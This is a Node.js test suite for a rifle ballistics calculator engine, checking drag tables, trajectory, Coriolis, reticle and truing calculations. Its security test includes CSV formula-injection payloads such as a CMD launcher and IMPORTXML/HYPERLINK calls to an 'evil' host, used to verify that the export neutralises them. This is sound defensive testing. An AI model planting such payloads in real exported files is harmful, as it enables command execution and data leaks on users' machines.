/**
 * BallisticPro — engine test suite.   Run:  node tests/run-tests.js   (or: npm test)
 * No dependencies. Loads the engine exactly like the browser does (see harness.js).
 */
const fs = require('fs');
const path = require('path');
const { loadEngine, makeConfig, scenarios } = require('./harness');

const E = loadEngine();
const sc = scenarios(E);
const golden = JSON.parse(fs.readFileSync(path.join(__dirname, 'golden-baseline.json'), 'utf8')).golden;

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); passed++; console.log('  ✓', name); }
  catch (e) { failed++; console.log('  ✗', name, '\n     ', e.message); }
}
function ok(cond, msg) { if (!cond) throw new Error(msg || 'assertion failed'); }
function near(a, b, tol, label) {
  if (!(Math.abs(a - b) <= tol)) throw new Error(`${label || 'value'}: ${a} vs ${b} (tol ${tol})`);
}
const rowAt = (res, m) => res.find(r => Math.abs(r.rangeM - m) < 1e-6);
const solve = (cfg, over = {}) => E.Solver.solve({ ...cfg, ...over });

console.log('\nDrag models');
test('O(1) lookup is identical to table interpolation (G1/G7/GA)', () => {
  for (const model of ['G1', 'G7', 'GA']) {
    const fn = E.DragModels.makeCdFunction(model);
    const table = E.DragModels.tables[model];
    for (let i = 0; i < 4000; i++) {
      const mach = Math.random() * (table[table.length - 1][0] + 0.5);
      near(fn(mach), E.DragModels.interpolateCd(table, mach), 1e-12, `${model} @ Mach ${mach.toFixed(4)}`);
    }
  }
});
test('custom drag table uses exact interpolation', () => {
  const custom = [[0, 0.3], [0.8, 0.25], [1.0, 0.5], [2.0, 0.4]];
  const fn = E.DragModels.makeCdFunction('CUSTOM', custom);
  near(fn(0.9), 0.375, 1e-12); near(fn(1.5), 0.45, 1e-12);
});

console.log('\nSolver — regression vs ORIGINAL engine (50 µs step)');
for (const name of Object.keys(sc).filter(n => n !== 'rifle308_incl')) {
  test(`${name}: drop/wind/velocity/ToF/energy within tolerance`, () => {
    const res = solve(sc[name]);
    const isCor = name.includes('_cor');
    let n = 0;
    for (const g of golden[name]) {
      const r = rowAt(res, g.rangeM); if (!r) continue; n++;
      // the original added a duplicate Coriolis estimate on top; compare w/o it
      near(r.dropIn, g.dropIn - (isCor ? g.coriolisVertIn : 0), 0.03, `drop @${g.rangeM}`);
      near(r.windageIn, g.windageIn - (isCor ? g.coriolisLatIn : 0), 0.01, `wind @${g.rangeM}`);
      near(r.velocityFps, g.velocityFps, 0.05, `v @${g.rangeM}`);
      near(r.tof, g.tof, 0.0001, `tof @${g.rangeM}`);
      near(r.energyFtLbs, g.energyFtLbs, 0.05, `E @${g.rangeM}`);
    }
    ok(n === golden[name].length, 'missing rows');
  });
}

console.log('\nSolver — correctness fixes');
test('final row is emitted at exactly maxRange (was missing)', () => {
  const res = solve(sc.rifle308);
  near(res[res.length - 1].rangeM, 1000, 1e-9); ok(res.length === 41, 'rows ' + res.length);
});
test('zero range: bullet is on the line of sight there (|drop| < 0.01 in)', () => {
  for (const [name, zeroYd] of [['rifle308', 100], ['lr22', 50], ['airgun22', 30], ['cm65_long', 100]]) {
    const cfg = sc[name];
    const res = solve(cfg, { stepM: zeroYd * 0.9144, maxRangeM: zeroYd * 0.9144 * 2 });
    near(res[1].dropIn, 0, 0.01, `${name} drop at zero`);
  }
});
test('Coriolis counted once: total windage shift == reported coriolisLatIn', () => {
  const withC = rowAt(solve(sc.rifle308_cor45N), 975);
  const noC = rowAt(solve(sc.rifle308_cor45N, { latDeg: 0 }), 975);
  near(withC.windageIn - noC.windageIn, withC.coriolisLatIn, 0.02, 'lateral');
  // analytic order of magnitude: Ω·sin(lat)·R·ToF
  const est = 7.292115e-5 * Math.sin(45 * Math.PI / 180) * 975 * withC.tof * 39.3701;
  ok(withC.coriolisLatIn > 0.6 * est && withC.coriolisLatIn < 1.4 * est, `lat ${withC.coriolisLatIn} vs est ${est}`);
});
test('Eötvös: shooting east raises POI, west lowers it (northern hemisphere)', () => {
  const east = rowAt(solve(sc.rifle308_cor45N, { azimuthDeg: 90 }), 975);
  const west = rowAt(solve(sc.rifle308_cor45N, { azimuthDeg: 270 }), 975);
  ok(east.coriolisVertIn > 0 && west.coriolisVertIn < 0, `east ${east.coriolisVertIn}, west ${west.coriolisVertIn}`);
});
test('Coriolis: southern hemisphere deflects the opposite way', () => {
  const n = rowAt(solve(sc.rifle308_cor45N, { latDeg: 45, azimuthDeg: 0 }), 975);
  const s = rowAt(solve(sc.rifle308_cor45N, { latDeg: -45, azimuthDeg: 0 }), 975);
  ok(n.coriolisLatIn > 0 && s.coriolisLatIn < 0, `n ${n.coriolisLatIn}, s ${s.coriolisLatIn}`);
});
test('inclined shot is sane (was +13,341 in at 20°) and follows the rifleman rule', () => {
  const flat = solve(sc.rifle308);
  const up = solve(sc.rifle308_incl);              // 20° uphill
  const R = 300, th = 20 * Math.PI / 180;
  const inc = rowAt(up, R);
  ok(Math.abs(inc.dropIn) < 500, 'absurd drop ' + inc.dropIn);
  // Full integration must land between the two classic approximations:
  //   rifleman's rule (angular drop at the horizontal range, applied at slant R)   — lower bound
  //   cosine rule      (flat drop at slant R × cosθ)                               — upper bound
  const flatR = solve(sc.rifle308, { maxRangeM: R, stepM: R })[1].dropIn;
  const flatH = solve(sc.rifle308, { maxRangeM: R * Math.cos(th), stepM: R * Math.cos(th) })[1].dropIn;
  const rifleman = flatH / Math.cos(th), cosine = flatR * Math.cos(th);   // both negative
  ok(inc.dropIn <= rifleman * 0.99 && inc.dropIn >= cosine * 1.01, `${inc.dropIn} not within [${cosine}, ${rifleman}]`);
  near(inc.dropIn, rifleman, Math.abs(rifleman) * 0.03, 'close to the rifleman rule');
  ok(Math.abs(inc.dropIn) < Math.abs(flatR), 'uphill must drop LESS than flat');
});
test('downhill also drops less than flat, symmetric to uphill', () => {
  const R = 300;
  const up = rowAt(solve(sc.rifle308, { lookAngleDeg: 20 }), R).dropIn;
  const down = rowAt(solve(sc.rifle308, { lookAngleDeg: -20 }), R).dropIn;
  near(up, down, Math.abs(up) * 0.05 + 0.05, 'symmetry');
});
test('right-hand twist drifts right, left-hand twist drifts left', () => {
  const r = rowAt(solve(sc.rifle308), 975).spinDriftIn, l = rowAt(solve(sc.lhtwist, { windSpeedMps: 0 }), 975).spinDriftIn;
  ok(r > 0 && l < 0, `rh ${r}, lh ${l}`);
});
test('wind from the right pushes the bullet left (negative windage)', () => {
  // windDir 90° with azimuth 0 = wind blowing from the east = from the right
  const w = rowAt(solve(sc.rifle308_wind), 500).windageIn;
  ok(Math.abs(w) > 1, 'wind effect too small: ' + w);
});
test('Miller stability for .308 175gr 1:10 is in the stable band', () => {
  const sg = rowAt(solve(sc.rifle308), 100).stabilityFactor; ok(sg > 1.3 && sg < 2.8, 'sg ' + sg);
});
test('energy and velocity decrease monotonically with range', () => {
  const res = solve(sc.cm65_long);
  for (let i = 1; i < res.length; i++) ok(res[i].velocityFps <= res[i - 1].velocityFps + 1e-9, 'v not monotonic @' + i);
});

console.log('\nReticle engine');
test('SFP range estimate scales by ref/current (was inverted: 600 m instead of 150 m)', () => {
  near(E.ReticleCalc.rangeEstimate(45, 'cm', 1.5, 'SFP', 14, 7).rangeM, 150, 1e-6);
  near(E.ReticleCalc.rangeEstimate(45, 'cm', 1.5, 'SFP', 14, 14).rangeM, 300, 1e-6);
  near(E.ReticleCalc.rangeEstimate(45, 'cm', 1.5, 'FFP', 14, 7).rangeM, 300, 1e-6);
});
test('SFP apparent reading is the inverse of the subtension correction', () => {
  const R = E.ReticleCalc;
  near(R.sfpApparent(R.sfpCorrection(1, 14, 7, 'SFP'), 14, 7, 'SFP'), 1, 1e-12);
});
test('firing solution exposes apparent reading and magRatio', () => {
  const row = rowAt(solve(sc.rifle308), 300);
  const sol = E.ReticleCalc.getFiringSolution(row, { focalPlane: 'SFP', magRef: 14, reticleUnit: 'mil', clickElev: 0.1, clickWind: 0.1, turretUnit: 'mil' }, 7);
  near(sol.magRatio, 0.5, 1e-12); near(sol.holdover.value, sol.holdover.raw * 0.5, 1e-12);
});

console.log('\nTruing / MPBR');
test('truing MV recovers a known velocity', () => {
  const truth = solve(sc.rifle308, { muzzleVelMps: 2700 * 0.3048, maxRangeM: 500, stepM: 500, skipBreakdown: true });
  const drop = truth[1].dropIn;
  const r = E.Truing.findMuzzleVelocity(sc.rifle308, 500, drop);
  near(r.truedVelFps, 2700, 2, 'MV');
});
test('truing BC recovers a known BC', () => {
  const truth = solve(sc.rifle308, { bc: 0.28, maxRangeM: 800, stepM: 800, skipBreakdown: true });
  const r = E.Truing.findBC(sc.rifle308, 800, truth[1].dropIn);
  near(r.truedBC, 0.28, 0.002, 'BC');
});
test('predicted drop beyond max range reports null (range exceeded)', () => {
  ok(E.Truing.getPredictedDrop(sc.rifle308, 1500) === null);
  ok(E.Truing.getPredictedDrop(sc.rifle308, 1000) !== null);
});
test('MPBR: matches the original engine; max ordinate ≈ radius; near < far < MPBR; fast', () => {
  const t0 = Date.now();
  const mp = E.MPBR.calculate(sc.rifle308, 4);
  const ms = Date.now() - t0;
  near(mp.maxOrdinateIn, 4, 0.05, 'max ordinate');
  near(mp.optimalZeroM, golden.mpbr.optimalZeroM, 0.5, 'optimal zero vs original');
  near(mp.nearZeroM, golden.mpbr.nearZeroM, 0.5, 'near zero vs original');
  near(mp.mpbrM, golden.mpbr.mpbrM, 0.5, 'MPBR vs original');
  // the optimal zero IS the far zero by construction
  near(mp.optimalZeroM, mp.farZeroM, 0.5, 'optimal == far zero');
  ok(mp.nearZeroM < mp.farZeroM && mp.farZeroM < mp.mpbrM, 'ordering');
  ok(ms < 1500, `MPBR took ${ms} ms (original: ~4500 ms)`);
});
test('truing agrees with the original engine (new one samples the exact range)', () => {
  near(E.Truing.findMuzzleVelocity(sc.rifle308, 457.2, -60).truedVelMps, golden.truingMV.truedVelMps, 0.5, 'MV m/s');
  near(E.Truing.findBC(sc.rifle308, 823, -250).truedBC, golden.truingBC.truedBC, 0.001, 'BC');
});

console.log('\nPerformance budget');
test('a 1000 m solve takes < 40 ms (original: 80–150 ms on a desktop)', () => {
  solve(sc.rifle308);                                  // warm-up
  const t0 = process.hrtime.bigint();
  for (let i = 0; i < 10; i++) solve(sc.rifle308);
  const ms = Number(process.hrtime.bigint() - t0) / 1e6 / 10;
  ok(ms < 40, `${ms.toFixed(1)} ms`);
});

console.log('\nSecurity hardening');
test('Solver clamps extreme/malicious inputs without DoS hang or NaN', () => {
  const t0 = Date.now();
  const res = solve(sc.rifle308, {
    maxRangeM: 1e9, stepM: 0.00001, integrationDt: 1e-9,
    lookAngleDeg: 90, muzzleVelMps: -500, bc: -2, zeroRangeM: 1e8
  });
  const ms = Date.now() - t0;
  ok(res.length <= 5001, `rows bounded <= 5001 (got ${res.length})`);
  ok(ms < 2000, `bounded solve completed quickly (${ms} ms)`);
  for (const r of res) {
    ok(Number.isFinite(r.rangeM) && Number.isFinite(r.dropIn) && Number.isFinite(r.windageIn), 'finite output row');
  }
});

test('DOPE.exportCSV neutralizes OWASP formula injection across all columns and keeps negative numbers', () => {
  const vm = require('vm');
  const store = new Map();
  const ctx = vm.createContext({
    localStorage: {
      getItem: k => (store.has(k) ? store.get(k) : null),
      setItem: (k, v) => store.set(k, String(v)),
      removeItem: k => store.delete(k)
    },
    console
  });
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'js', 'engine', 'dope.js'), 'utf8') + '\nthis.DOPE = DOPE;', ctx);

  // Corrupted non-array localStorage must not crash getAll()
  store.set('ballisticpro_dope', '{"not":"an array"}');
  ok(Array.isArray(ctx.DOPE.getAll()) && ctx.DOPE.getAll().length === 0, 'non-array JSON safely returns []');
  ctx.DOPE.clearAll();

  ctx.DOPE.add({
    date: '=CMD|"/C calc"!A0',
    weapon: '  +SUM(A1:A2)',
    ammo: '\t=1+1',
    scope: '@IMPORTXML("http://evil")',
    distance: '-1+1',
    temp: -12.45,
    pressure: 1013.25,
    humidity: 50,
    windSpeed: '\r-2+3',
    windDir: 90,
    elevClicks: 14,
    windClicks: -3,
    elevMoa: -4.25,
    windMoa: 1.5,
    calcDropMoa: -4.3,
    calcWindMoa: 1.4,
    groupSize: 0.75,
    poiResult: '=HYPERLINK("http://evil")',
    notes: 'normal, "quoted" note'
  });

  const csv = ctx.DOPE.exportCSV('metric');
  const lines = csv.split('\n');
  ok(lines.length === 2, 'header + 1 data row');
  const row = lines[1];
  ok(row.startsWith('"\'=CMD|""/C calc""!A0",'), `date formula neutralized & RFC-4180 quoted: ${row}`);
  ok(row.includes(",'  +SUM(A1:A2),"), 'leading whitespace + plus formula neutralized');
  ok(row.includes(",'\t=1+1,"), 'leading tab formula neutralized');
  ok(row.includes(',"\'@IMPORTXML(""http://evil"")",'), '@ formula neutralized & RFC-4180 quoted');
  ok(row.includes(",'-1+1,"), 'negative expression neutralized');
  ok(row.includes(',-12.45,') && row.includes(',-3,') && row.includes(',-4.25,'), 'plain negative numbers kept numeric');
  ok(row.includes('"\'\r-2+3"'), 'CR-prefixed formula neutralized and RFC-4180 quoted');
  ok(row.includes(',"\'=HYPERLINK(""http://evil"")",'), 'poiResult formula neutralized & RFC-4180 quoted');
});

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
